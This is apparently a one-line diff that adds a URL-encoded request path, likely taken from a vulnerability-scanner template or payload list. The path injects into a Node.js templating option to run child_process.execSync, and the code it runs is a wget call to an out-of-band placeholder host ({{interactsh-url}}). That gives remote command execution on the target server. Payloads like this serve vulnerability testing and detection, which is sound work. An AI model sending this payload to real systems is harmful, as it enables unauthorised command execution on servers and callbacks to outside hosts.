@@ -1,0 +1,1 @@
+/page?settings[view%20options][closeDelimiter]=x%22)%3bprocess.mainModule.require(%27child_process%27).execSync(%27wget+http://{{interactsh-url}}%27)%3b//
